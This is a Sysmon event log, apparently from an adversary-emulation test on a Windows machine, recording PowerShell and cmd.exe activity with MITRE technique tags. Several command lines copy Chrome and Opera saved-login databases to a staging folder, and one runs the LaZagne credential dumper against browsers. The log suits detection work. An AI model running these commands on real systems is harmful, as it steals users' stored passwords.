+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:15.198
+ProcessGuid: {1ac2ee8c-5703-656d-d902-000000001000}
+ProcessId: 7028
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:APPDATA\Opera Software\Opera Stable\Login Data\"""" -Destination \""""C:temp\..\ExternalPayloads\""""}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:15.193
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:15.006
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:15 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:15.006
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:14.646
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:14.225
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+PipeName: \PSHost.133461381140153444.5960.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:14.131
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_vkarca04.tfb.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:14.099
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_vkarca04.tfb.ps1
+CreationUtcTime: 2023-12-04 04:35:14.099
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:14.084
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:14.053
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:14.053
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:14.037
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:14.037
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
+Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:14.037
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\System32\mscoree.dll
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mscoree.dll
+Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:14.006
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5702-656d-d702-000000001000}
+TargetProcessId: 5960
+TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:14.015
+ProcessGuid: {1ac2ee8c-5702-656d-d702-000000001000}
+ProcessId: 5960
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""powershell.exe"" & {Copy-Item \""""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\"""" -Destination \""""C:temp\..\ExternalPayloads\""""
+Copy-Item \""""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account\"""" -Destination \""""C:temp\..\ExternalPayloads\""""}
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:14 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:14.006
+ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ProcessId: 3600
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:13 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
+RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
+UtcTime: 2023-12-04 04:35:13.787
+SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
+SourceProcessId: 3600
+SourceThreadId: 8604
+SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetProcessGUID: {1ac2ee8c-5701-656d-d502-000000001000}
+TargetProcessId: 8840
+TargetImage: C:\Windows\system32\cmd.exe
+GrantedAccess: 0x1FFFFF
+CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
+SourceUser: DESKTOP-92IIJB9\Test
+TargetUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:13 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2023-12-04 04:35:13.819
+ProcessGuid: {1ac2ee8c-5701-656d-d502-000000001000}
+ProcessId: 8840
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: ""cmd.exe"" /c ""C:temp\bin\LaZagne.exe"" browsers
+CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
+User: DESKTOP-92IIJB9\Test
+LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
+LogonId: 0x131F4C
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=F1EFB0FDDC156E4C61C5F78A54700E4E7984D55D,MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18
+ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
+ParentProcessId: 3600
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:13 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
+RuleName: -
+EventType: SetValue
+UtcTime: 2023-12-04 04:35:13.646
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Details: Binary Data
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:13 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: -
+UtcTime: 2023-12-04 04:35:13.646
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
+CreationUtcTime: 2023-12-04 04:32:15.278
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:13 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:13.084
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: Client Interface
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: mpclient.dll
+Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
+RuleName: -
+EventType: CreatePipe
+UtcTime: 2023-12-04 04:35:12.740
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+PipeName: \PSHost.133461381125370334.4840.DefaultAppDomain.powershell
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
+RuleName: -
+UtcTime: 2023-12-04 04:35:12.662
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+User: DESKTOP-92IIJB9\Test
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_114lrlcz.4xe.ps1
+Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
+IsExecutable: false"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
+RuleName: technique_id=T1059.001,technique_name=PowerShell
+UtcTime: 2023-12-04 04:35:12.647
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_114lrlcz.4xe.ps1
+CreationUtcTime: 2023-12-04 04:35:12.647
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
+UtcTime: 2023-12-04 04:35:12.600
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
+FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
+Description: IOfficeAntiVirus Module
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: MpOAV.dll
+Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
+Signed: true
+Signature: Microsoft Windows
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:12.584
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Just-In-Time Compiler
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clrjit.dll
+Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:12.568
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft Common Language Runtime Class Library
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscorlib.dll
+Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:12.568
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
+FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
+Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: clr.dll
+Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
+Signed: true
+Signature: Microsoft Corporation
+SignatureStatus: Valid
+User: DESKTOP-92IIJB9\Test"
+Information,12/3/2023 8:35:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
+RuleName: technique_id=T1055,technique_name=Process Injection
+UtcTime: 2023-12-04 04:35:12.568
+ProcessGuid: {1ac2ee8c-5700-656d-d302-000000001000}
+ProcessId: 4840
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
+Description: Microsoft .NET Runtime Execution Engine
+Product: Microsoft® .NET Framework
+Company: Microsoft Corporation
+OriginalFileName: mscoreei.dll
